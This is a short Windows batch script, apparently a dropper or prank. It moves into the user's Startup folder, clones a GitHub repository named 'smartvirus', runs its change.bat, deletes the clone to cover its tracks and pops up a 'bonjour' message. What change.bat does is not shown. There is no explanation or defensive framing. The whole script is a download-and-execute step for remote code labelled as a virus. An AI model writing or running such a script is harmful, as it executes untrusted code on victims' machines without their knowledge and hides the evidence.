cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
rmdir /s /q smartvirus
git clone https://github.com/mattistjnn/smartvirus
cd smartvirus
start change.bat
cd ..
rmdir /s /q smartvirus 
pause
msg * "bonjour"